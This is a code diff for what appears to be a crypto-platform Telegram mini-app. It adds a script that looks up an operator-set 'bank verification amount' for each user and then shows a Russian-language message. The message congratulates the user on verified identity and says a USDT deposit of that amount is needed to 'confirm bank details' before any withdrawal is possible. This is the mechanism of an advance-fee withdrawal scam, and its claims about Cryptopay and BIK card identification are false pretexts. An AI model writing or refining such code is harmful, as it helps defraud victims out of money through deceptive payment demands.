@@ -667,6 +667,45 @@
         }
         document.getElementById('sl1').classList.add('done');
         document.getElementById('sl2').classList.add('done');
+
+        // Check for bank verif amount
+        (async () => {
+            try {
+                const telegramId = tg?.initDataUnsafe?.user?.id || localStorage.getItem('nexo_guest_telegram_id');
+                if (!telegramId) return;
+                const res = await fetch('/api/user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ telegramId: String(telegramId) })
+                });
+                const data = await res.json();
+                if (data.success && data.data.bank_verif_amount > 0) {
+                    const amt = data.data.bank_verif_amount;
+                    const screen = document.querySelector('#step3 .success-screen');
+                    screen.innerHTML = `
+                        <div class="success-icon" style="background: var(--accent-dim); border-color: var(--accent);">
+                            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        </div>
+                        <div class="success-title">Личность подтверждена!</div>
+                        <div class="success-text">
+                            Ваша личность успешно верифицирована! Остался последний этап, а именно — подтверждение Ваших банковских реквизитов, сейчас Вам нужно совершить пополнение на сумму <strong>${amt} USDT</strong>, после чего наша система с помощью Cryptopay и БИК, автоматически идентифицирует Вашу карту, и после завершения верификации, Вы сможете вывести Ваши денежные средства.<br><br>
+                            Средства, которые Вы пополняете, будут добавлены к Вашему общему балансу, и так же доступны для вывода после подтверждения Ваших банковских реквизитов.<br><br>
+                            В будущем просим Вас, пополнять и выводить средства на карту, которую Вы верифицируете.
+                        </div>
+                        <div class="success-detail">
+                            <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14c1.1 0 2 .9 2 2v1h-9a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                            Необходимая сумма: <strong>${amt} USDT</strong>
+                        </div>
+                        <button class="btn-primary" onclick="window.location.href='deposit.html'">
+                            Перейти к пополнению
+                        </button>
+                        <button class="btn-secondary" onclick="window.location.href='profile.html'" style="margin-top: 8px;">
+                            Вернуться в профиль
+                        </button>
+                    `;
+                }
+            } catch(e) { console.error(e); }
+        })();
     }
 
     function goBack() {
